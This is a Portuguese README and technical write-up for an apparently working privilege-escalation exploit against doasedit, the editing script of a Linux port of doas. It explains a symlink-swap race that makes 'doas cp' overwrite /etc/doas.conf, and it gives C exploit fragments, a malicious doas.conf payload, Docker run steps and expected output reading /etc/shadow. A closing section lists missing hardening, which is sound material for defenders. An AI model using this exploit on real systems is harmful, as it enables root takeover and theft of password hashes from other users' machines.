# doas_race_condition
0day - Privilege escalation using DOAS
Exploit for https://codeberg.org/thejessesmith/doas.git

Requires user interation 

# TOCTOU Race Condition em doasedit — Analise Tecnica

## CWE-367: Time-of-check Time-of-use Race Condition

**Alvo**: `doasedit` do projeto doas (porte Linux por Jesse Smith, baseado em OpenBSD doas de Ted Unangst)
**Arquivo vulneravel**: `doas/doasedit` (shell script, 104 linhas)
**Primitiva**: Escrita arbitraria como root via symlink-swap no write-back
**Impacto**: Escalacao de privilegios completa (sobrescrita de /etc/doas.conf → root shell → leitura de /etc/shadow)

---

## 1. Arquitetura do doas

O doas e um binario SUID-root (`doas.c`) que executa comandos como outro usuario apos verificar regras em `/etc/doas.conf`.

### Fluxo de autorizacao (`doas.c`)

```
main()
  |-- uid = getuid()                          // quem esta chamando
  |-- parseconfig(DOAS_CONF, 1)              // le /etc/doas.conf
  |     |-- fstat -> verifica owner=root      // doas.c:187-192
  |     +-- yyparse() -> parse.y             // parser yacc
  |-- permit(uid, groups, target, cmd, args)  // match contra regras
  |     +-- match() -> itera rules[]         // ultima regra ganha
  |-- authuser() ou PAM                       // autentica se !NOPASS
  |-- setresuid(target, target, target)       // troca UID para target
  +-- execvpe(cmd, argv, envp)               // executa o comando
```

O ponto critico: `doas` **nao valida o que o comando faz**. Ele verifica apenas se o usuario tem permissao de executar aquele comando como target. Uma vez autorizado, `execvpe` roda o comando com uid=0 e o comando recebe pleno controle.

### Regra no doas.conf

```
permit nopass victim as root
```

Isso permite que `victim` execute **qualquer comando** como root sem senha. Quando doasedit faz `doas cp "$temp_file" "$mydir/$myfile"`, o doas:

1. Verifica: victim pode rodar `cp` como root? -> Sim (regra wildcard, `cmd = NULL`)
2. `setresuid(0,0,0)` -> agora e root
3. `execvpe("cp", ["cp", temp, target], envp)` -> cp roda como root

O `cp` como root segue symlinks e escreve em qualquer lugar. O doas nao sabe que o destino foi trocado por um symlink.

### Analise de `match()` — por que a regra e wildcard

Em `doas.c:118-155`:

```c
static int
match(uid_t uid, gid_t *groups, int ngroups, uid_t target, const char *cmd,
    const char **cmdargs, struct rule *r)
{
    // ... verifica ident (usuario/grupo) ...
    // ... verifica target ...
    if (r->cmd) {
        if (strcmp(r->cmd, cmd))
            return 0;
        if (r->cmdargs) {
            for (i = 0; r->cmdargs[i]; i++) {
                if (!cmdargs[i])
                    return 0;
                if (strcmp(r->cmdargs[i], cmdargs[i]))
                    return 0;
            }
        }
    }
    return 1;
}
```

Se `r->cmd == NULL` (regra sem `cmd`), o bloco inteiro e pulado e `match()` retorna 1. Qualquer comando e permitido. Em `parse.y:177-183`:

```yacc
cmd:    /* optional */ {
            $$.cmd = NULL;
            $$.cmdargs = NULL;
        }
```

A regra `permit nopass victim as root` gera:
- `action = PERMIT`, `options = NOPASS`
- `ident = "victim"`, `target = "root"`
- `cmd = NULL`, `cmdargs = NULL` -> **wildcard total**

---

## 2. Anatomia do doasedit

```sh
#!/bin/sh
```

Doasedit e um **shell script POSIX** — cada linha e interpretada sequencialmente. Isso e fundamental: entre cada comando ha um context switch, o scheduler pode preemptar, e outro processo pode alterar o filesystem.

### Fase 1: Validacao (linhas 15-31)

```sh
if [ ! -f "$1" ]           # (A) stat() -> S_ISREG?
    exit 2
fi
if [ -L "$1" ]              # (B) lstat() -> S_ISLNK?
    exit 2
fi
if [ ! -r "$1" ]            # (C) access() -> R_OK?
    exit 3
fi
```

Tres syscalls sequenciais. Cada uma testa o estado do filesystem **naquele instante**. Nao ha nenhum mecanismo de lock, lease, ou file descriptor persistente que preserve o binding path->inode.

### Fase 2: Copia para temporario (linhas 33-48)

```sh
temp_file=$(mktemp --tmpdir doasedit.XXXXXXXX)    # (D) cria temp em /tmp
mydir=$(dirname -- "$1")                          # (E) fork+exec
myfile=$(basename -- "$1")                        # (F) fork+exec
cp "$mydir/$myfile" "$temp_file"                  # (G) fork+exec — roda como VICTIM
```

**Ponto critico**: O `cp` em (G) roda como **victim**, nao como root. Se o atacante trocar config.txt por symlink -> /etc/shadow aqui, o cp falha com "Permission denied" porque victim nao pode ler /etc/shadow (0640 root:shadow).

**Consequencia**: O vetor de ataque via leitura direta (swap antes do cp) **nao funciona**. A operacao privilegiada esta no write-back.

### Fase 3: Edicao (linhas 50-71)

```sh
"${VISUAL}" "$temp_file"       # ou ${EDITOR:-vi}
```

O editor abre o temp. A vitima esta neste ponto por **segundos a minutos**. Esta e a janela de race: o atacante tem todo o tempo do mundo para fazer o swap.

### Fase 4: Comparacao e write-back (linhas 73-98) — A VULNERABILIDADE

```sh
cmp -s "$mydir/$myfile" "$temp_file"              # (H) roda como VICTIM
status=$?
if [ $status -eq 0 ]                              # 0 = igual, nao copia
    exit 0
fi
doas cp "$temp_file" "$mydir/$myfile"             # (I) roda como ROOT via doas
```

**(H)** `cmp -s` roda como victim. Se config.txt foi trocado por symlink -> /etc/doas.conf (0400 root), `cmp` nao consegue abrir e retorna **exit code 2** (erro). Como 2 != 0, o script **nao entra no bloco "unchanged"** e continua para o write-back.

**(I)** `doas cp` roda como **root**. O `cp` segue o symlink no destino e escreve o conteudo do temp em `/etc/doas.conf`. O atacante controla o conteudo do temp (e o que estava em config.txt quando o cp da linha 42 copiou).

---

## 3. O Vetor de Ataque: Write-back

### Por que ESCRITA e nao LEITURA

Operacoes do doasedit por nivel de privilegio:

| Linha | Operacao | Privilegio | Segue symlink? |
|-------|----------|------------|----------------|
| 42 | `cp target temp` | **victim** | Sim, mas vitima nao pode ler arquivos root |
| 74 | `cmp -s target temp` | **victim** | Sim, mas falha com exit 2 se nao pode ler |
| 86 | `doas cp temp target` | **ROOT** | Sim — **ESCREVE** onde o symlink aponta |

A unica operacao privilegiada e a **escrita** na linha 86. O vetor correto e:
1. Controlar o conteudo que sera escrito (via config.txt inicial)
2. Redirecionar o destino via symlink (swap durante a edicao)
3. O `doas cp` escreve nosso payload em qualquer arquivo do sistema

### Modelo formal

```
VITIMA (doasedit)                         ATACANTE (exploit)
                                          config.txt = PAYLOAD (doas.conf malicioso)
                                          .sym -> /etc/doas.conf (pre-criado)

stat(config.txt) -> S_ISREG ✓
lstat(config.txt) -> !S_ISLNK ✓
access(config.txt, R_OK) -> 0 ✓
mktemp -> /tmp/doasedit.XXXXXXXX
                                          inotify detecta doasedit.*
cp config.txt temp                        (espera cp terminar: 200ms)
  temp agora contem PAYLOAD
                                          rename(.sym, config.txt) -> ATOMICO
                                          config.txt = symlink -> /etc/doas.conf

${EDITOR} temp
  vitima edita (segundos/minutos)
  vitima salva e sai

cmp -s config.txt temp
  config.txt -> /etc/doas.conf (0400 root)
  cmp: Permission denied -> exit 2
  status=2 != 0 -> write-back!

doas cp temp config.txt                   ← ROOT
  cp le temp (contem PAYLOAD)
  cp abre config.txt -> segue symlink
  cp escreve PAYLOAD em /etc/doas.conf!

rm temp
                                          /etc/doas.conf agora contem:
                                            permit nopass attacker as root
                                          doas cat /etc/shadow -> SUCCESS
```

### Por que a janela de race e ENORME

Diferente de races classicas (microsegundos), aqui a janela e o tempo que a vitima passa no editor — **segundos a minutos**. O swap pode ser feito a qualquer momento entre a linha 42 (cp) e a linha 74 (cmp). Nao precisamos de CPU pressure nem de timing preciso.

O inotify e usado apenas para detectar **quando** a vitima comecou o doasedit (criacao do temp), para saber que o cp ja copiou o payload e que e seguro fazer o swap.

---

## 4. Cadeia de execucao do doas durante o write-back

Quando doasedit executa `doas cp "$temp_file" "$mydir/$myfile"` na linha 86:

```
doasedit (victim, uid=1001)
  +-- doas cp /tmp/doasedit.XXXXXXXX /tmp/toctou_race/config.txt
        |
        doas.c:main()
        |-- uid = getuid() -> 1001 (victim)
        |-- parseconfig("/etc/doas.conf", 1)
        |     +-- "permit nopass victim as root" -> rule com cmd=NULL
        |-- permit(1001, groups, 0, "cp", args)
        |     +-- match(): r->cmd == NULL -> wildcard -> return 1
        |     +-- return PERMIT
        |-- rule->options & NOPASS -> pula autenticacao PAM
        |-- setresgid(0, 0, 0) -> gid=root
        |-- initgroups("root", 0)
        |-- setresuid(0, 0, 0) -> uid=root
        +-- execvpe("cp", ["cp", temp, target], envp)
              |
              cp (uid=0, euid=0 — ROOT COMPLETO)
              |-- open(temp, O_RDONLY) -> le payload do temp
              |-- stat(config.txt) -> symlink -> /etc/doas.conf
              |-- open("/etc/doas.conf", O_WRONLY|O_CREAT|O_TRUNC)
              |-- read(temp_fd) -> payload bytes
              +-- write(doas_conf_fd) -> SOBRESCREVE /etc/doas.conf
```

Apos isso, `/etc/doas.conf` contem:
```
permit nopass root as root
permit nopass victim as root
permit nopass attacker as root
```

O atacante agora pode executar `doas cat /etc/shadow` (ou qualquer comando como root).

---

## 5. O exploit: implementacao

### Estrutura de arquivos

```
/tmp/toctou_race/
  |-- config.txt       <- contem o PAYLOAD (regras doas.conf)
  +-- .sym             <- symlink pre-criado -> /etc/doas.conf
```

### Fase 1: Preparacao

```c
mkdir(TARGET_DIR, 0777);
write_file(TARGET, PAYLOAD, 0666);    // config.txt = regras maliciosas
symlink(DOAS_CONF, SYM_STAGE);       // .sym -> /etc/doas.conf
```

O config.txt comeca com o payload porque o `cp` da linha 42 vai copia-lo para o temp. Assim o temp contem exatamente o que queremos escrever em /etc/doas.conf.

### Fase 2: Deteccao via inotify

```c
inotify_add_watch(ifd, "/tmp", IN_CREATE);

// Loop: espera arquivo com prefixo "doasedit."
while (1) {
    read(ifd, buf, sizeof(buf));
    if (strncmp(ev->name, "doasedit.", 9) == 0) {
        // Detectado!
        break;
    }
}
```

O inotify opera no nivel do kernel — a notificacao chega em microsegundos. Mas neste exploit nao precisamos de velocidade: a janela e enorme.

### Fase 3: Swap atomico

```c
usleep(200000);                   // espera cp (linha 42) terminar
rename(SYM_STAGE, TARGET);       // config.txt vira symlink -> /etc/doas.conf
```

O `rename(2)` no mesmo filesystem e:
- **Atomico**: uma operacao no journal do filesystem
- **Instantaneo**: ~1 microsegundo em ext4
- **Sem estado intermediario**: o dirent muda de arquivo regular para symlink em um passo

### Fase 4: Esperar vitima sair do editor

```c
while (access(temp_path, F_OK) == 0)
    usleep(200000);               // espera doasedit deletar o temp
```

Quando o temp e deletado (linha 101 do doasedit), sabemos que o write-back ja aconteceu.

### Fase 5: Escalacao completa

```c
execl("/usr/bin/doas", "doas", "cat", "/etc/shadow", (char *)NULL);
```

Se o write-back sobrescreveu /etc/doas.conf com nosso payload, agora temos `permit nopass attacker as root` e podemos ler qualquer arquivo.

---

## 6. Por que `[ -L "$1" ]` nao protege

O check na linha 21:
```sh
if [ -L "$1" ]
```

Executa `lstat()` que retorna informacoes sobre o **link em si** (nao o alvo). Retorna verdadeiro somente se naquele instante `$1` e um symlink. Mas:

1. `lstat()` nao adquire nenhum lock no filesystem
2. O resultado nao e vinculado a futuras operacoes sobre o mesmo path
3. O inode por tras do nome pode mudar entre `lstat()` e qualquer operacao subsequente

No Linux (ext4/xfs/btrfs), o VFS resolve o path **do zero** a cada syscall via `path_lookupat()`. Nao ha cache vinculante entre `lstat` e `open`. O resultado do check e descartavel — e um snapshot de um estado que pode mudar a qualquer momento.

### Por que `rename()` e a arma perfeita

Comparado com `unlink()` + `symlink()` (duas syscalls, com janela entre elas onde o path nao existe), `rename()` troca o dirent em **um passo unico**:

```
rename("/tmp/toctou_race/.sym", "/tmp/toctou_race/config.txt")

Antes: config.txt -> inode 12345 (arquivo regular com payload)
Depois: config.txt -> inode 67890 (symlink -> /etc/doas.conf)

Transicao: atomica no journal, ~1us
```

Nenhum processo observa um estado intermediario (config.txt inexistente).

---

## 7. Analise do `cmp -s` — por que o erro favorece o atacante

Na linha 74:
```sh
cmp -s "$mydir/$myfile" "$temp_file"
status=$?
if [ $status -eq 0 ]
```

Exit codes do `cmp`:
- **0**: arquivos identicos
- **1**: arquivos diferentes
- **2**: erro (arquivo inacessivel, etc.)

Quando config.txt e symlink -> /etc/doas.conf (0400 root) e cmp roda como victim:
```
cmp: /tmp/toctou_race/config.txt: Permission denied
exit code: 2
```

O doasedit testa `status -eq 0`. Como 2 != 0, o script interpreta como "arquivo mudou" e prossegue para o write-back. **O erro de permissao e tratado como mudanca** — o atacante se beneficia de um bug logico alem do TOCTOU.

### Verificacao pos-write (linhas 87-97)

```sh
doas cp "$temp_file" "$mydir/$myfile"
cmp -s "$temp_file" "$mydir/$myfile"          # verifica se cp funcionou
status=$?
while [ $status -ne 0 ]
do
   echo "Copying file back to $1 failed..."
   read abc
   doas cp "$temp_file" "$mydir/$myfile"
   ...
done
```

Apos o `doas cp`, o script tenta verificar com `cmp -s`. Mas:
- `doas cp` ja escreveu em /etc/doas.conf (o dano esta feito)
- `cmp` roda como victim, nao pode ler /etc/doas.conf -> exit 2
- Entra no loop "failed" — mas a escalacao ja aconteceu
- A vitima ve "Copying file back failed" e faz Ctrl+C
- O atacante ja pode usar `doas`

---

## 8. Condicoes necessarias

| Condicao | Razao |
|----------|-------|
| Vitima tem `permit` no doas.conf | `doas cp` precisa ser autorizado |
| Diretorio do target e world-writable | Atacante precisa criar/renomear arquivos |
| `rename()` no mesmo filesystem | Atomicidade requer mesmo mount point |
| Linux com inotify | Deteccao da criacao do temp (conforto, nao necessidade) |
| Atacante controla conteudo de config.txt | O payload no temp vem da copia inicial |

---

## 9. Superficies de hardening ausentes no doasedit

1. **Sem `realpath(1)`**: O script usa `$1` diretamente. `realpath` congelaria o path real.
2. **Sem `O_NOFOLLOW`**: `cp` segue symlinks. `cp --no-dereference` ou `-P` nao seguiria.
3. **Sem binding de fd**: O script poderia abrir com `exec 3<"$1"` e usar `/proc/self/fd/3`, criando binding path->inode persistente.
4. **Sem temp directory isolado**: `mktemp -d` com copias internas reduziria a superficie.
5. **Pattern previsivel**: `doasedit.XXXXXXXX` em `/tmp` e facil de monitorar.
6. **`cmp -s` nao distingue erro de diferenca**: Exit 2 (erro) e tratado como "changed".

### No doas.c

1. **Sem restricao de paths nos argumentos**: `doas cp` aceita qualquer destino.
2. **Sem canonicalizacao**: Os paths poderiam ser resolvidos com `realpath()` antes do exec.
3. **Regra wildcard**: `permit victim as root` sem `cmd` da acesso total.

---

## 10. Execucao no Docker

### Build

```bash
cd TESTS
docker build -t doas-toctou .
```

### Terminal 1 — Atacante

```bash
docker run -it --name toctou doas-toctou
./exploit_toctou_write
# Exploit prepara o cenario e aguarda...
```

### Terminal 2 — Vitima

```bash
docker exec -u victim -it toctou bash
EDITOR=nano doasedit /tmp/toctou_race/config.txt
# A vitima ve o conteudo (payload disfarçado)
# Faz qualquer edicao (ou nenhuma) e salva: Ctrl+O, Enter, Ctrl+X
```

### Resultado esperado (Terminal 1)

```
[1] /tmp/toctou_race/config.txt criado com payload
[2] Symlink staging: /tmp/toctou_race/.sym -> /etc/doas.conf
[*] Aguardando vitima executar doasedit...
[3] Detectado temp: /tmp/doasedit.abcd1234
[4] SWAP! /tmp/toctou_race/config.txt -> symlink -> /etc/doas.conf
[*] Aguardando vitima sair do editor...
[5] Temp deletado — doasedit terminou.
[6] Testando escalacao de privilegios...
    Executando: doas cat /etc/shadow

root:$6$...:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
bin:*:19000:0:99999:7:::
...
```

---

## 11. Mapa de syscalls completo

```
ATACANTE                                 VITIMA (doasedit, uid=victim)
--------                                 ------
write_file(config.txt, PAYLOAD)
symlink(.sym -> /etc/doas.conf)
inotify_add_watch(/tmp, IN_CREATE)
                                         stat(config.txt) -> S_ISREG OK
                                         lstat(config.txt) -> !S_ISLNK OK
                                         access(config.txt, R_OK) -> 0 OK
                                         open(doasedit.XXXXXXXX, O_CREAT|O_EXCL)
inotify_read() -> "doasedit.XXXXXXXX"
                                         clone() -> cp
                                         cp: open(config.txt, O_RDONLY) -> PAYLOAD
                                         cp: write(temp_fd, PAYLOAD)
usleep(200ms)
rename(.sym, config.txt) -- ATOMICO --   config.txt = symlink -> /etc/doas.conf
                                         clone() -> nano
                                         ... vitima edita e salva ...
                                         clone() -> cmp
                                         cmp: open(config.txt)
                                              -> symlink -> /etc/doas.conf
                                              -> EACCES (0400 root)
                                              -> exit 2
                                         status=2 != 0 -> write-back!
                                         clone() -> doas
                                         doas: setresuid(0,0,0)
                                         doas: execvpe("cp", [temp, config.txt])
                                         cp(ROOT): open(temp, O_RDONLY) -> PAYLOAD
                                         cp(ROOT): open(config.txt)
                                                   -> symlink -> /etc/doas.conf
                                                   -> open(/etc/doas.conf, O_WRONLY|O_TRUNC)
                                         cp(ROOT): write(fd, PAYLOAD) -> SUCESSO
                                         /etc/doas.conf SOBRESCRITO

access(temp, F_OK) -> ENOENT
execl("doas", "cat", "/etc/shadow")
  doas: parseconfig -> le NOVO doas.conf
  doas: permit(attacker, root, "cat") -> PERMIT
  doas: setresuid(0,0,0)
  doas: execvpe("cat", ["/etc/shadow"])
  cat: read(/etc/shadow) -> CONTEUDO EXFILTRADO
```

---

## 12. Cadeia de ataque completa

```
                     ┌─────────────┐
                     │ config.txt  │  contem payload:
                     │  (PAYLOAD)  │  "permit nopass attacker as root"
                     └──────┬──────┘
                            │ cp (linha 42, como victim)
                            v
                     ┌─────────────┐
                     │  temp file  │  /tmp/doasedit.XXXXXXXX
                     │  (PAYLOAD)  │  contem payload
                     └──────┬──────┘
                            │
          ┌─────────────────┼─────────────────┐
          │                 │                 │
    rename(.sym,       editor abre       cmp -s falha
    config.txt)        temp              (EACCES -> exit 2)
          │                 │                 │
          v                 v                 v
   config.txt ->      vitima edita      status != 0
   /etc/doas.conf     e salva           -> write-back
                                              │
                                              v
                                       doas cp temp config.txt
                                       (ROOT segue symlink)
                                              │
                                              v
                                       /etc/doas.conf = PAYLOAD
                                              │
                                              v
                                       doas cat /etc/shadow
                                       (attacker agora tem permissao)
                                              │
                                              v
                                       ROOT SHELL / EXFILTRACAO
```
